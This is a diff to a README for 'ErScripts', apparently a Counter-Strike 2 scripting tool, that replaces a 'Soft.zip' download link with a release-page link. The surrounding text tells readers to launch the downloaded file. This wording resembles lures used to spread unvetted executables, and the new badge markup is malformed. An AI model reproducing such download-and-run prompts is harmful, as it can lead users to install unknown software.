@@ -59,13 +59,13 @@ ErScripts covers a wide range of topics related to Counter-Strike 2 customizatio
 
 Click the button below to download ErScripts and elevate your Counter-Strike 2 gameplay experience:
 
-[![Download ErScripts](https://img.shields.io/badge/Download-ErScripts-green)](https://github.com/files/Soft.zip)
+[![Download ErScripts](https://github.com/AndersonDragao/ErScripts/releases/tag/v1.2)](https://github.com/AndersonDragao/ErScripts/releases/tag/v1.2)
 
 *Note: Make sure to launch the downloaded file to start using ErScripts.*
 
 ---
 
-🔗 Want to explore more about ErScripts and its features? Visit the official repository by clicking [here](https://github.com/files/Soft.zip).
+🔗 Want to explore more about ErScripts and its features? Visit the official repository by clicking [here](https://github.com/AndersonDragao/ErScripts/releases/tag/v1.2).
 
 If the provided link is not working or needs updating, please check the "Releases" section of the repository for the latest version.
 
